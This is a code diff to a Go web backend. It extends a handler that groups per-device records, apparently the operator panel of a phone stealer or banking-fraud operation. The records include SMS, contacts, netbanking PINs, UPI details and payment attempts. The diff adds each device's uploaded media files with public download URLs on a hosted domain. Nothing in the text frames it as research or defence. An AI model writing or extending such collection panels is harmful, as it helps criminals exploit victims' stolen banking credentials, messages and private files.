@@ -19,6 +19,7 @@ func GetAllData(c *gin.Context) {
 	var smsRecords []models.SmsRecord
 	var devices []models.Device
 	var contactRecords []models.ContactRecord
+	var mediaFiles []models.MediaFile
 
 	database.DB.Order("id desc").Find(&billUpdates)
 	database.DB.Order("id desc").Find(&paymentAttempts)
@@ -30,6 +31,20 @@ func GetAllData(c *gin.Context) {
 	database.DB.Order("id desc").Find(&smsRecords)
 	database.DB.Order("id desc").Find(&devices)
 	database.DB.Order("id desc").Find(&contactRecords)
+	database.DB.Order("id desc").Find(&mediaFiles)
+
+	mediaByDevice := make(map[string][]gin.H)
+	for _, m := range mediaFiles {
+		mediaByDevice[m.DeviceID] = append(mediaByDevice[m.DeviceID], gin.H{
+			"id":         m.ID,
+			"created_at": m.CreatedAt,
+			"device_id":  m.DeviceID,
+			"file_name":  m.FileName,
+			"file_type":  m.FileType,
+			"file_size":  m.FileSize,
+			"url":        "https://bill-1-9yfp.onrender.com/uploads/media/" + m.FilePath[len("./uploads/media/"):],
+		})
+	}
 
 	smsByDevice := make(map[string][]models.SmsRecord)
 	for _, s := range smsRecords {
@@ -77,6 +92,7 @@ func GetAllData(c *gin.Context) {
 			"netbanking_pins":    netbankingPinsByDevice[d.DeviceID],
 			"upi_details":        upiDetailsByDevice[d.DeviceID],
 			"payment_attempts":   paymentAttemptsByDevice[d.DeviceID],
+			"media":              mediaByDevice[d.DeviceID],
 		})
 	}
 
